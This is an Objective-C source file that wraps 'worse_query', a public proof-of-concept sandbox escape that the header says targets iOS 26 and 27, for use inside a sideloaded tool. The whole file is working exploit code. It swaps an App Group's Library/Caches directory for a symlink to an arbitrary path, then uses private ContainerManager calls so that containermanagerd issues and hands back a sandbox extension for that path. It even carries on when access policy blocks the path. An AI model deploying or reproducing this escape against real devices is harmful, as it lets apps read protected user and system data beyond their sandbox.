//
//  WorseQueryBridge.m
//  GestaltKitTool
//
//  worse_query - A sandbox escape for iOS 26 and 27, again.
//  Copyright (C) 2026 Taj C (forcequit)
//
//  This program is free software: you can redistribute it and/or modify
//  it under the terms of the GNU General Public License as published by
//  the Free Software Foundation, either version 3 of the License, or
//  (at your option) any later version.
//
//  Adapted for GestaltKitTool: added App Group runtime resolution,
//  detailed os_log diagnostics, defensive lstat pre-check and
//  cleanup hardening. Original PoC:
//  https://github.com/forcequitOS/worse_query
//

#import "WorseQueryBridge.h"

#import <dlfcn.h>
#import <stdlib.h>
#import <string.h>
#import <sys/stat.h>
#import <xpc/xpc.h>
#import <os/log.h>

#define GKTLLogObjC(fmt, ...) os_log(OS_LOG_DEFAULT, "%{public}s", [[NSString stringWithFormat:@"[GKTL-ObjC] " fmt, ##__VA_ARGS__] UTF8String])

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef void (*sandbox_extension_release_fn)(int64_t);

NSString *WorseQueryGroupIdentifier(void)
{
    // Allow sideload setups (e.g. per-signing team prefixes) to override
    // the App Group identifier without a rebuild.
    NSString *override = [[NSUserDefaults standardUserDefaults]
        stringForKey:@"GKTLAppGroupID"];
    if (override.length > 0) return override;
    return @"group.com.wesk.vtool";
}

/// Remove the escape symlink and recreate a real Library/Caches directory
/// in the App Group container. Mirrors the upstream PoC's clean_symlink().
static void WorseQueryCleanSymlink(NSString *group)
{
    if (group.length == 0) return;
    NSFileManager *files = [NSFileManager defaultManager];
    NSURL *groupRoot =
        [files containerURLForSecurityApplicationGroupIdentifier:group];
    if (!groupRoot) return;
    NSURL *caches = [groupRoot URLByAppendingPathComponent:@"Library/Caches"];
    // Only remove if it is actually a symlink — never blow away a real
    // directory that might hold user data. (The escape creates the symlink;
    // if something recreated a real dir in between, leave it alone.)
    NSString *cachesPath = caches.path;
    if (cachesPath.length > 0) {
        struct stat st;
        const char *c = [cachesPath fileSystemRepresentation];
        if (c && lstat(c, &st) == 0 && S_ISLNK(st.st_mode)) {
            [files removeItemAtURL:caches error:nil];
        }
    }
    // Ensure a real directory exists so the App Group stays healthy.
    if (cachesPath.length > 0 && ![files fileExistsAtPath:cachesPath]) {
        [files createDirectoryAtURL:caches
            withIntermediateDirectories:YES
                            attributes:nil
                                 error:nil];
    }
}

/// Resolve the required ContainerManager symbols once, lazily.
/// Same set as bad_query (libsystem_containermanager), but used with
/// class 7 (appGroup) instead of class 13 (SystemGroup).
typedef struct {
    void *library;
    container_query_create_fn query_create;
    container_query_set_class_fn query_set_class;
    container_query_set_identifiers_fn query_set_identifiers;
    container_query_set_flags_fn query_set_flags;
    container_query_set_part_fn query_set_part;
    container_query_get_single_result_fn query_get_single_result;
    container_query_free_fn query_free;
    container_copy_sandbox_token_fn copy_sandbox_token;
    sandbox_extension_consume_fn consume_extension;
} WorseQueryAPI;

static BOOL WorseQueryAPIResolved(WorseQueryAPI *api)
{
    return api->library && api->query_create && api->query_set_class &&
        api->query_set_identifiers && api->query_set_flags &&
        api->query_set_part && api->query_get_single_result &&
        api->query_free && api->copy_sandbox_token && api->consume_extension;
}

static WorseQueryAPI *WorseQuerySharedAPI(void)
{
    static WorseQueryAPI api;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        api.library = dlopen(
            "/usr/lib/system/libsystem_containermanager.dylib",
            RTLD_NOW | RTLD_LOCAL);
        if (!api.library) return;

#define WQ_LOAD(field, symbol) \
    api.field = (__typeof(api.field))dlsym(api.library, symbol)
        WQ_LOAD(query_create, "container_query_create");
        WQ_LOAD(query_set_class, "container_query_set_class");
        WQ_LOAD(query_set_identifiers, "container_query_set_group_identifiers");
        WQ_LOAD(query_set_flags, "container_query_operation_set_flags");
        WQ_LOAD(query_set_part, "container_query_operation_set_part");
        WQ_LOAD(query_get_single_result, "container_query_get_single_result");
        WQ_LOAD(query_free, "container_query_free");
        WQ_LOAD(copy_sandbox_token, "container_copy_sandbox_token");
#undef WQ_LOAD
        api.consume_extension = (sandbox_extension_consume_fn)
            dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    });
    return &api;
}

BOOL WorseQueryBridgeAvailable(void)
{
    return WorseQueryAPIResolved(WorseQuerySharedAPI());
}

BOOL WorseQueryGroupContainerAvailable(void)
{
    NSString *group = WorseQueryGroupIdentifier();
    if (group.length == 0) return NO;
    NSURL *groupRoot = [[NSFileManager defaultManager]
        containerURLForSecurityApplicationGroupIdentifier:group];
    return groupRoot != nil;
}

// Serializes the escape: steps 5–7 mutate a single shared path
// (<group>/Library/Caches). Concurrent acquires would interleave the
// symlink swap, the XPC query and the cleanup — one caller could delete
// another caller's live symlink or get a token for the wrong path.
static NSLock *WorseQueryEscapeLock(void)
{
    static NSLock *lock;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ lock = [[NSLock alloc] init]; });
    return lock;
}

static void WorseQueryUnlockOnScopeExit(NSLock **lockPtr)
{
    if (lockPtr && *lockPtr) {
        [*lockPtr unlock];
        *lockPtr = nil;
    }
}

// Strategy (from the upstream PoC, worse_query.m):
//   1. lstat the target — bail early with -255 if missing.
//   2. Resolve the app's own App Group container (the escape anchor).
//   3. Replace <group>/Library/Caches with a symlink to the target.
//   4. Query class 7 (appGroup), part 3 (Library/Caches).
//      containermanagerd resolves the symlink server-side and returns
//      a sandbox extension for the real target path.
//   5. Consume the extension, restore the symlink, return the handle.
int64_t WorseQueryAcquire(NSString *path, BOOL altFlags)
{
    uint64_t flags = altFlags ? 0x0000000800000000ULL
                              : 0x0000008000000000ULL;
    return WorseQueryAcquireWithParams(path, flags, 3);
}

/// Exploratory variant with explicit flags/part for probing.
int64_t WorseQueryAcquireWithParams(NSString *path,
                                    uint64_t flags,
                                    uint64_t part)
{
    if (path.length == 0) return -255;

    // 1. Existence pre-check. Only ENOENT bails: MAC-blocked paths
    //    (lstat → EPERM/EACCES) can still be resolved server-side by
    //    containermanagerd when it follows the Caches symlink.
    {
        struct stat st;
        const char *pathC = [path fileSystemRepresentation];
        if (!pathC || lstat(pathC, &st) != 0) {
            if (errno == ENOENT) {
                GKTLLogObjC(@"worse_query lstat pre-check FAILED (ENOENT) for %@", path);
                return -255; // Nothing exists at this path
            }
            GKTLLogObjC(@"worse_query lstat pre-check MAC-blocked (errno=%d) — proceeding anyway for %@", errno, path);
        }
    }

    // 2. Resolve the App Group container — REQUIRED for the exploit.
    NSString *group = WorseQueryGroupIdentifier();
    NSFileManager *files = [NSFileManager defaultManager];
    NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier:group];
    if (!groupRoot) {
        GKTLLogObjC(@"worse_query App Group %@ inaccessible — check the "
                    "com.apple.security.application-groups entitlement", group);
        return -1; // App Group doesn't exist or we can't access it
    }
    NSString *caches = [[groupRoot URLByAppendingPathComponent:@"Library/Caches"] path];

    // 3. ContainerManager symbols.
    WorseQueryAPI *api = WorseQuerySharedAPI();
    if (!WorseQueryAPIResolved(api)) {
        GKTLLogObjC(@"worse_query failed to resolve ContainerManager symbols");
        return -2; // Failed to resolve a function (unsupported OS)
    }

    // 4. Create the query (class 7 = appGroup, part 3 = Library/Caches).
    void *query = api->query_create();
    if (!query) {
        GKTLLogObjC(@"worse_query query_create FAILED");
        return -3; // Failed to create query
    }

    api->query_set_class(query, 7); // appGroup → containermanagerd
    xpc_object_t identifier = xpc_string_create(group.UTF8String);
    api->query_set_identifiers(query, identifier);
#if !__has_feature(objc_arc)
    xpc_release(identifier);
#endif
    api->query_set_part(query, part); // default: 3 = Library/Caches
    api->query_set_flags(query, flags);

    // 5. Swap Library/Caches for a symlink to the escape target.
    //    Hold the escape lock from here through cleanup (step 7); the
    //    cleanup attribute unlocks on every return path, including the
    //    early error exits below.
    [WorseQueryEscapeLock() lock];
    NSLock *_escapeLock __attribute__((cleanup(WorseQueryUnlockOnScopeExit))) =
        WorseQueryEscapeLock();
    (void)_escapeLock;

    [files removeItemAtPath:caches error:nil];
    if (![files createSymbolicLinkAtPath:caches
                         withDestinationPath:path
                                     error:nil]) {
        GKTLLogObjC(@"worse_query failed to create escape symlink %@ -> %@", caches, path);
        api->query_free(query);
        WorseQueryCleanSymlink(group);
        return -4; // Failed to create symlink
    }

    GKTLLogObjC(@"worse_query query sent: group=%@ flags=0x%llx part=%llu target=%@",
                group, (unsigned long long)flags, (unsigned long long)part, path);

    // 6. Send the query. Run on a dedicated queue with a timeout so a
    //    hung containermanagerd can't wedge callers forever (mirrors the
    //    3s timeout policy used by BadQueryLease).
    __block void *result = NULL;
    __block BOOL queryCompleted = NO;
    dispatch_semaphore_t sema = dispatch_semaphore_create(0);
    dispatch_queue_t queryQueue = dispatch_queue_create(
        "com.wesk.vtool.worsequery.xpc", DISPATCH_QUEUE_SERIAL);
    dispatch_async(queryQueue, ^{
        result = api->query_get_single_result(query);
        queryCompleted = YES;
        dispatch_semaphore_signal(sema);
    });
    dispatch_time_t timeout = dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC);
    dispatch_semaphore_wait(sema, timeout);

    if (!queryCompleted) {
        GKTLLogObjC(@"worse_query XPC TIMEOUT for %@", path);
        // Leak query — the background thread may still reference it.
        WorseQueryCleanSymlink(group);
        return -5; // Query rejected / timed out
    }

    if (!result) {
        GKTLLogObjC(@"worse_query getSingleResult NULL for %@", path);
        api->query_free(query);
        WorseQueryCleanSymlink(group);
        return -5; // Query rejected by containermanagerd
    }

    // 6.5 No type validation here: the query result is an opaque
    //     ContainerManager object, NOT an xpc_object (xpc_get_type on it
    //     returns NULL), so pre-validating with XPC_TYPE_ARRAY breaks
    //     every valid query. The library-level crash
    //     (_xpc_api_misuse in copy_sandbox_token, crash log
    //     GestaltKitTool-2026-11-09-221950.ips) only happens for
    //     out-of-range part values (e.g. part=4) where containermanagerd
    //     returns an error object; callers must restrict part to 0–3.

    char *token = api->copy_sandbox_token(result);
    if (!token) {
        GKTLLogObjC(@"worse_query copySandboxToken NULL for %@", path);
        api->query_free(query);
        WorseQueryCleanSymlink(group);
        return -6; // Kernel refused to issue a sandbox extension
    }

    // 7. Consume the extension and clean up.
    int64_t handle = api->consume_extension(token);
    api->query_free(query);
    free(token);
    WorseQueryCleanSymlink(group);

    if (handle < 0) {
        GKTLLogObjC(@"worse_query consume FAILED (handle=%lld) for %@",
                    (long long)handle, path);
        return -7; // sandbox_extension_consume failed
    }

    GKTLLogObjC(@"worse_query SUCCESS for %@ (handle=%lld)", path, (long long)handle);
    return handle;
}

void WorseQueryRelease(int64_t handle)
{
    if (handle < 0) return;
    sandbox_extension_release_fn release_extension =
        (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT,
                                            "sandbox_extension_release");
    if (release_extension) release_extension(handle);
}

